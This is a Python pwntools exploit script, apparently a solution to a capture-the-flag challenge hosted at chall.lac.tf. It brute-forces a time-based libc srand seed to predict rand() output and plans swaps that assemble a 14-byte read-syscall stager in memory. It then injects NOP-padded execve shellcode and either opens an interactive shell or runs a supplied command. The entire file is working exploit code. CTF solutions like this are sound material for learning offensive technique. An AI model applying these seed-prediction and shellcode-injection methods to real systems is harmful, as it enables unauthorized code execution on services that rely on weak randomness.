#!/usr/bin/env python3
from pwn import *
import ctypes
import re
import time

context.arch = "amd64"
context.log_level = "info"

TARGET = bytes([
    0x48, 0x96, 0x31, 0xff, 0x31, 0xd2, 0xb2, 0x80,
    0x31, 0xc0, 0x0f, 0x05, 0xff, 0xe6,
])

libc = ctypes.CDLL("libc.so.6")
libc.srand.argtypes = [ctypes.c_uint]
libc.rand.restype = ctypes.c_int


def read_hand(io):
    vals = []
    while True:
        line = io.recvline()
        m = re.findall(rb"\b[0-9a-fA-F]{2}\b", line)
        if len(m) == 14:
            vals = [int(x, 16) for x in m]
            break
    return vals


def find_seed(observed, now=None, window=86400):
    if now is None:
        now = int(time.time())
    for seed in range(now - window, now + 5):
        libc.srand(seed)
        ok = True
        for b in observed:
            if (libc.rand() & 0xFF) != b:
                ok = False
                break
        if ok:
            return seed
    return None


def plan_swaps(seed, initial, target):
    libc.srand(seed)
    for _ in range(14):
        libc.rand()

    hand = initial[:]
    unsat = [i for i in range(14) if hand[i] != target[i]]
    swaps = []

    while unsat:
        b = libc.rand() & 0xFF
        idx = None
        for i in unsat:
            if target[i] == b:
                idx = i
                break
        if idx is None:
            idx = unsat[0]

        hand[idx] = b
        if hand[idx] == target[idx]:
            unsat.remove(idx)
        swaps.append(idx)

        if len(swaps) > 100000:
            raise RuntimeError("swap planning ran too long")

    return swaps


def main():
    if args.REMOTE:
        io = remote("chall.lac.tf", 31338)
    else:
        io = process("./chall")

    hand = read_hand(io)
    log.info("initial hand: %s", " ".join(f"{b:02x}" for b in hand))

    seed = find_seed(hand)
    if seed is None:
        log.failure("seed not found in window")
        return
    log.info("seed: %d", seed)

    swaps = plan_swaps(seed, hand, list(TARGET))
    log.info("planned swaps: %d", len(swaps))

    stage2 = b"\x90" * 12 + asm(shellcraft.sh())
    if len(stage2) > 0x80:
        log.failure("stage2 too large: %d", len(stage2))
        return

    script = b"".join(b"1\n%d\n" % idx for idx in swaps) + b"2\n"
    io.send(script)
    io.send(stage2)

    if args.CMD:
        time.sleep(0.2)
        io.sendline(args.CMD.encode())
        io.sendline(b"exit")
        data = io.recvall(timeout=2)
        if data:
            print(data.decode(errors="replace"))
        return

    io.interactive()


if __name__ == "__main__":
    main()
